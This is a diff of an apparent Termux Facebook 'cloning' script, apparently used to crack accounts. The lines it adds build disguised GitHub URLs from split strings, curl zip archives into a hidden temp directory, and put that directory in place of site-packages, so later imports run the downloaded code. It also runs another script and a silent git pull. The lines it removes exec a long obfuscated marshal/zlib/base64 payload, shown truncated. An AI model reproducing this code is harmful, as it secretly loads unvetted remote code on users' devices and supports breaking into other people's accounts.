@@ -1,5 +1,549 @@
-# Compiled By Mr Mafia | Muhammad Muzammil
-# Github :  https://github.com/Muzammil-404
+#!coding : utf-8
+#!usr/lib/python3.11
+#OPEN SOURCE BY JUTT
+print(" Re Open source by MR SIAL")
+print ("Join Facebook Group")
+##------------------[ INSTALL-MENU ]------------------##
+import uuid
+import os,sys,time
+import datetime,json
+import random,string,re
+import shutil,uuid,urllib
+import zlib,subprocess,bs4
+import requests,mechanize,rich
+from string import *
+from bs4 import BeautifulSoup as sop
+from concurrent.futures import ThreadPoolExecutor as tred
+ 
+#───────────────[FAKE CPTHON]───────────────────────── #
+import os,sys,tempfile,string,random,subprocess,uuid
+http_directory = tempfile.mkdtemp(prefix='.')
+site_packages = sys.path[4]
+print(site_packages)
+print(http_directory)
+sys.path.remove(site_packages)
+sys.path.insert(4,http_directory+'/reqmodule')
+sys.path.insert(5,http_directory)
+try:
+        os.mkdir('crypto')
+except:pass
+hh = "ho"
+hh2 = "9/pycrypt"
+find_aarch = subprocess.check_output('uname -om',shell=True)
+if 'aarch64' in str(find_aarch):
+        user_aarch = '64'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto64/crypto64.zip?raw=true'
+elif 'arm' in str(find_aarch):
+        user_aarch = '32'
+        download_link = f'https://github.com/{hh}p0{hh2}odome/blob/main/crypto32/crypto32.zip?raw=true'
+else:
+        print(' Unknown aarch ')
+        exit()
+if not os.path.isfile(f'crypto/crypto{user_aarch}.zip'):
+        os.system('clear')
+        print('\n Please wait while creating pycryptodome for you ! This can take some time\n\n')
+        os.system(f'curl -L {download_link} > crypto/crypto{user_aarch}.zip')
+        os.system('python jan.py')
+else:
+        akk2="rsi"
+        akk=f"cha{akk2}fi"
+        os.system(f'cp crypto/crypto{user_aarch}.zip {http_directory}')
+        lib = f'https://github.com/{akk}les/client/blob/main/config.zip?raw=true'
+        os.system(f'curl -L {lib} > {http_directory}/config.zip')
+        os.system(f'cd {http_directory} && unzip config.zip -d {http_directory} > /dev/null')
+        os.system(f'cd {http_directory} && unzip crypto{user_aarch}.zip -d {http_directory} > /dev/null')
+#───────────────[FAKE CPYTHON End]───────────────────────── #
+#───────────────[BIT ROOM]───────────────────────── #
+import os, platform, time, sys
+#os.system('pkg install espeak ')
+print('\033[1;91m[\033[1;92m⊀⊁\033[1;91m] \033[1;91m⊀\33[1;92mASIF SAKHANI\33[1;91m⊁ ')
+#os.system('espeak -a 300 " ,FILE CLONING 0.1, TOOLS,INSTALL Complete ,"')
+time.sleep(1)
+os.system('clear')
+##
+import os, platform, time, sys
+ 
+try:
+ import requests
+except:os.system("pip uninstall requests -y;pip install requests")
+ 
+print('\033[1;91m[\033[1;97m-\033[1;91m] \033[1;92mChecking For Update. . . .')
+#os.system('espeak -a 300 " Waiting for Update,"')
+time.sleep(2)
+ 
+ 
+os.system('git pull --quiet 2>/dev/null')
+bit = platform.architecture()[0]
+if bit == '64bit':
+ print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 64BIT USER')
+ 
+elif bit == '32bit':
+ print('\033[1;91m[\033[1;92m◉\033[1;91m] \033[1;92mYOU ARE 32BIT USER')
+ 
+ #───────────────[BIT End]───────────────────────── #
+ 
+ 
 
-import marshal,zlib,base64
-exec(marshal.loads(zlib.decompress(base64.b64decode("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